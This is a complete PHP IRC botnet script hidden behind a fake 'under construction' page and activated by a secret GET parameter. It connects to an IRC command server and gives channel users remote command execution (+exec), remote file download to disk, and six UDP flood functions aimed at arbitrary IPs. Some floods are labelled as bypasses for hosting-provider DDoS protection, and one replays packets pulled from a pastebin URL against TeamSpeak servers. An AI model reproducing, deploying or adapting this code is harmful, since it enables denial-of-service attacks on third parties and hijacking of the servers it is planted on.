<?php
set_time_limit(0);
error_reporting(0);

if(isset($_GET['key']) == "doom") {
    class sell {
        var $config = array(
					'server' => 'gaia.sorcery.net',
					'port' => '6667',
					"key" => '',
					'prefix' => 'Linux',
					'maxrand' => '5',
					'chan' => '#end',
					'trigger' => '.',
					'password' => '',
					'auth' => ''
				);
        var $users = array();
        function start() {
            while (true) {
                if (!($this->conn = fsockopen($this->config['server'], $this->config['port'], $e, $s, 30))) $this->start();
                $pass = $this->config['password'];
                $alph = range("0", "9");
                $this->send("PASS " . $pass . "");
								if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $ident = "Windows";
								else $ident = "Linux";
								$this->send("USER " . $ident . " 127.0.0.1 localhost :" . php_uname() . "");
								$this->set_nick();
                $this->main();
            }
        }
        function main() {
            while (!feof($this->conn)) {
                if (function_exists('stream_select')) {
                    $read = array($this->conn);
                    $write = NULL;
                    $except = NULL;
                    $changed = stream_select($read, $write, $except, 30);
                    if ($changed == 0) {
                        fwrite($this->conn, "PING: No.\r\n");
                        $read = array($this->conn);
                        $write = NULL;
                        $except = NULL;
                        $changed = stream_select($read, $write, $except, 30);
                        if ($changed == 0) break;
                    }
                }
                $this->buf = trim(fgets($this->conn, 512));
                $cmd = explode(" ", $this->buf);
                if (substr($this->buf, 0, 6) == "PING :") {
                    $this->send("PONG: " . substr($this->buf, 6));
                    continue;
                }
                if (isset($cmd[1]) && $cmd[1] == "001") {
                    $this->auth($this->config['auth']);
                    $this->join($this->config['chan'], $this->config['key']);
                    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->join(" ");
                    else $this->join("");
                    continue;
                }
                if (isset($cmd[1]) && $cmd[1] == "433") {
                    $this->set_nick();
                    continue;
                }
                if ($this->buf != $old_buf) {
                    $mcmd = array();
                    $msg = substr(strstr($this->buf, " :"), 2);
                    $msgcmd = explode(" ", $msg);
                    $nick = explode("!", $cmd[0]);
                    $vhost = explode("@", $nick[1]);
                    $vhost = $vhost[1];
                    $nick = substr($nick[0], 1);
                    $host = $cmd[0];
                    if ($msgcmd[0] == $this->nick) for ($i = 0; $i < count($msgcmd); $i++) $mcmd[$i] = $msgcmd[$i + 1];
                    else for ($i = 0; $i < count($msgcmd); $i++) $mcmd[$i] = $msgcmd[$i];
                    if (count($cmd) > 2) {
                        switch ($cmd[1]) {
                            case "PRIVMSG":
                                if (substr($mcmd[0], 0, 1) == "+") {
                                    switch (substr($mcmd[0], 1)) {
                                        case "exec":
                                            $command = substr(strstr($msg, $mcmd[0]), strlen($mcmd[0]) + 1);
                                            $exec = exec($command);
                                            $ret = explode("\n", $exec);
                                            for ($i = 0; $i < count($ret); $i++)
                                                if ($ret[$i] != NULL)
                                                    $this->privmsg($this->config['chan'], " : " . trim($ret[$i]));
                                            break;
                                        case "download":
                                            if (count($mcmd) > 2) {
                                                if (!$fp = fopen($mcmd[2], "w")) {
                                                    $this->privmsg($this->config['chan'], "[\2download\2]: could not open output file.");
                                                } else {
                                                    if (!$get = file($mcmd[1])) {
                                                        $this->privmsg($this->config['chan'], "[\2download\2]: could not download \2" . $mcmd[1] . "\2");
                                                    } else {
                                                        for ($i = 0; $i <= count($get); $i++) {
                                                            fwrite($fp, $get[$i]);
                                                        }
                                                        $this->privmsg($this->config['chan'], "[\2download\2]: file \2" . $mcmd[1] . "\2 downloaded to \2" . $mcmd[2] . "\2");
                                                    }
                                                    fclose($fp);
                                                }
                                            } else {
                                                $this->privmsg($this->config['chan'], "[\2download\2]: use .download http://your.host/file /tmp/file");
                                            }
                                            break;
																				case "rawudp":
																						if (count($mcmd) > 5) {
																								$this->rawudp($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4], $mcmd[5], $mcmd[6]);
																						} else {
																								$this->privmsg($this->config['chan'], "How to use: +rawudp IP PORT TIME SIZE CONTENT PACKETS/ms");
																						}
																						break;
																				case "voxility":
																						if (count($mcmd) > 3) {
																								$this->voxility($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
																						} else {
																								$this->privmsg($this->config['chan'], "How to use: +voxility IP PORT TIME PACKETS/ms");
																						}
																						break;
																				case "ovhbypass":
																						if (count($mcmd) > 3) {
																								$this->ovhbypass($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
																						} else {
																								$this->privmsg($this->config['chan'], "How to use: +ovhbypass IP PORT TIME PACKETS/ms");
																						}
																						break;
																				case "bandwidth":
																						if (count($mcmd) > 3) {
																								$this->bandwidth($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
																						} else {
																								$this->privmsg($this->config['chan'], "How to use: +bandwidth IP PORT TIME PACKETS/ms");
																						}
																						break;
																				case "highpps":
																						if (count($mcmd) > 3) {
																								$this->highpps($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
																						} else {
																								$this->privmsg($this->config['chan'], "How to use: +highpps IP PORT TIME PACKETS/ms");
																						}
																						break;
																				case "teamspeak":
																						if (count($mcmd) > 3) {
																								$this->teamspeak($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
																						} else {
																								$this->privmsg($this->config['chan'], "How to use: +teamspeak IP PORT TIME PASTEURL, For example this one -> http://pastebin.com/raw/PPziAj1w");
																						}
																						break;
																				case "help":
																						if (count($mcmd) > 0) {
																								$this->privmsg($this->config['chan'], "Commands: +ovhbypass, +rawudp, +bandwidth, +highpps, +teamspeak, +voxility, +download, +exec, +die");
																						}
																						break;
																				case "die":
																						if (count($mcmd) > 0) {
																								fclose($this->conn);
																								exit();
																						}
																						break;
																		}
                                }
																break;
                        }
                    }
                }
            }
        }

				function rawudp($host, $port, $time, $size, $packets, $content) {
						$this->privmsg($this->config['chan'], "This will be the end.");
						for ($i = 0; $i < $size; $i++) {
								$packet .= chr(rand(128, 256));
						}
						$end = time() + $time;
						$i = 0;
						$fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
						while (true) {
								for($z = 0; $z<$packets; $z++) {
										fwrite($fp, $content);
								}
								fflush($fp);
								if ($i % 100 == 0) {
										if ($end < time()) break;
								}
								$i++;
						}
						fclose($fp);
						$this->privmsg($this->config['chan'], "Done.");
				 }

				 function voxility($host, $port, $time, $packets) {
						$this->privmsg($this->config['chan'], "This will be the end.");
						$end = time() + $time;
						$i = 0;
						$fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
						while (true) {
								$str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
								$str1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
								$packet = substr(str_shuffle($str), 0, 5);
								$packet1 = substr(str_shuffle($str1), 0, 5);
								$size = mt_rand( 256, 512 );
								for ($i = 0; $i < $size; $i++) {
										$packet .= chr(rand(1, 128));
										$packet1 .= chr(rand(1, 128));
								}
								for($z = 0; $z<$packets; $z++) {
										fwrite($fp, $packet);
										fwrite($fp, $packet1);
								}
								fflush($fp);
								if ($i % 100 == 0) {
										if ($end < time()) break;
								}
								$i++;
						}
						fclose($fp);
						$this->privmsg($this->config['chan'], "Done.");
				 }

				 function ovhbypass($host, $port, $time, $packets) {
						$this->privmsg($this->config['chan'], "This will be the end.");
						$end = time() + $time;
								$i = 0;
								$fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
						while (true) {
								$str = '0123456789abcdefghjklmnopqrstuvwxyz';
								$packet = str_shuffle($str);
								$packet .= chr(rand(1, 256));
								for($z = 0; $z<$packets; $z++) {
										fwrite($fp, $packet);
								}
								fflush($fp);
								if ($i % 100 == 0) {
										if ($end < time()) break;
								}
								$i++;
						}
						fclose($fp);
						$this->privmsg($this->config['chan'], "Done.");
				 }

				 function bandwidth($host, $port, $time, $packets) {
						$this->privmsg($this->config['chan'], "This will be the end.");
						$end = time() + $time;
						$packet = '0day';
						$packet1 = 'xFF0';
						for ($i = 0; $i < 2048; $i++) {
								$packet .= chr(128);
								$packet1 .= chr(128);
						}
						$i = 0;
						$fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
						while (true) {
								for($z = 0; $z<$packets; $z++) {
										fwrite($fp, $packet);
										fwrite($fp, $packet1);
								}
								fflush($fp);
								if ($i % 100 == 0) {
										if ($end < time()) break;
								}
								$i++;
						}
						fclose($fp);
						$this->privmsg($this->config['chan'], "Done.");
				 }

				 function highpps($host, $port, $time, $packets) {
						$this->privmsg($this->config['chan'], "This will be the end.");
						$end = time() + $time;
						$i = 0;
						$fp = fsockopen("udp://". $host, $port, $e, $s, 5);
						while (true) {
								$packet = 'xFF0';
								for($z = 0; $z<$packets; $z++) {
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
										fwrite($fp, $packet);
								}
								fflush($fp);
								if ($i % 100 == 0) {
										if ($end < time()) break;
								}
								$i++;
						}
						fclose($fp);
						$this->privmsg($this->config['chan'], "Done.");
				 }

				function teamspeak($host, $port, $time, $pasteurl) {
						$this->privmsg($this->config['chan'], "This will be the end.");
						$fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
						$init1 = base64_decode("VFMzSU5JVDEAZQAAiAalP5oAV5QKaSKfQwcAAAAAAAAAAA==");
						$init2 = base64_decode("VFMzSU5JVDEAZQAAiAalP5oCq72VH4ERjMrdhzl5ACxgjAdDnyI=");
						$init3 = base64_decode("VFMzSU5JVDEAZQAAiAalP5oEKZ2bFjjUVrKhYueQRKFORM9YEXdZKBjIRtpYqkhO7+mN45pkEFQUnxbEAiHg/71rXTWm3o5ccYpD77GDfkZzz+DyzUV6W6BGY+w49OebfrVQaqkCriXRZA/fUF104Oa1AKai7gLClB/DkMFjVryH3phFqxgd6uPbnuALaF000X0AACcQ2Bux4HRtXOOJtGK/vaLXkpTM0qeBReFVmuEdcARTzCV1dmwfdeqnOreoFpu1i1VCc+31ktJdXQooSMQdDgehivl3OWge1Y45gWYNcH/dFelTiZ9RVjfqGrHYGo315bucN49EaECeKUXkoi+xkJvHypV3pw6BeDCKsHcv3n9TSgoBcORk2Lr01i0OFKPdDmlQqQkkTl36j2d9u4kcSHU1zWtrCo9jbGllbnRpbml0aXYgYWxwaGE9MmxSNE01VlRQeDF4ZWc9PSBvbWVnYT1NRXNEQWdjQUFnRWdBaUFiSWNCS2VXZEdZbEFMeTZyMDZ6YkQwbm4xY1lWZmdjUnlvSSt0MGJ5cExRSWdldTIxYW5xaVJ1Nlptd0oySFc2ZVwvTXg3NUJqQTdkYm5aWHNZU1YydzVjVT0gaXA9");
						fwrite($fp, $init1);
						usleep(15000);
						fwrite($fp, $init2);
						usleep(15000);
						fwrite($fp, $init3 . $host);
						usleep(115000);
						$raw = file_get_contents($pasteurl);
						$pack = array();
						foreach (preg_split("/((\r?\n)|(\r\n?))/", $raw) as $line) {
								$decoded = base64_decode($line);
								array_push($pack, $decoded);
						}
						$end = time() + $time;
						$i = 0;
						while (true) {
								foreach ($pack as $packet) {
										fwrite($fp, $packet);
								}
								fflush($fp);
								if ($i % 100 == 0) {
										if ($end < time()) break;
								}
								$i++;
						}
						fclose($fp);
						$this->privmsg($this->config['chan'], "Done.");
				 }

				function send($msg) {
						fwrite($this->conn, $msg . "\r\n");
				}
				function join($chan, $key = NULL) {
						$this->send("JOIN " . $chan . " " . $key);
				}
				function auth($chan) {
						$this->send("PART " . $chan);
				}
				function privmsg($to, $msg) {
						$this->send("PRIVMSG " . $to . " :" . $msg);
				}
				function notice($to, $msg) {
						$this->send("NOTICE " . $to . " :" . $msg);
				}
				function set_nick() {
						$prefix = "BOT[A]%s";
						$nickk = substr(str_shuffle("1234567890"), 0, $this->config['maxrand']);
						$this->nick = sprintf($prefix, $nickk);
						$this->send("NICK " . $this->nick);
				}
    }
    $poll = new sell;
    $poll->start();
} else {
		echo "This Website is still under construction, come back soon! :)";
}
?>
